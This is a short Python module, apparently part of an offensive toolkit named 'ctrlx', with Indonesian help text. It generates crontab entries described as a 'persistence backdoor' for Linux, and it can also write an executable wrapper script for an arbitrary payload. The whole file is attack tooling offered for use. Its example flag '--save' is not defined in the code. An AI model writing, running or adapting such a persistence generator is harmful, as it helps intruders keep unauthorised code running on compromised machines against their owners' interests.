import argparse
import os
import stat

def build_cronjob(command, interval, filename):
    cron_line = f"*/{interval} * * * * {command}"
    return f"# Cronjob Backdoor\n{cron_line}\n"

def run(raw_args):
    parser = argparse.ArgumentParser(
        prog="ctrlx rda --type c9n",
        description="Generate cronjob entry untuk persistence backdoor (Linux)",
        epilog="Contoh: python ctrlx.py rda --type c9n --command '/path/payload' --interval 10 --save"
    )

    parser.add_argument("--command", required=True, help="Perintah atau path file yang akan dijalankan")
    parser.add_argument("--interval", default="5", help="Interval dalam menit (default: 5)")
    parser.add_argument("--filename", help="(Opsional) Nama file script jika ingin langsung membuatnya")

    args = parser.parse_args(raw_args)
    result = build_cronjob(args.command, args.interval, args.filename)

    # Jika ingin membuat script langsung (opsional)
    if args.filename:
        with open(args.filename, 'w') as f:
            f.write("#!/bin/bash\n")
            f.write(f"{args.command}\n")
        os.chmod(args.filename, os.stat(args.filename).st_mode | stat.S_IEXEC)

    return result
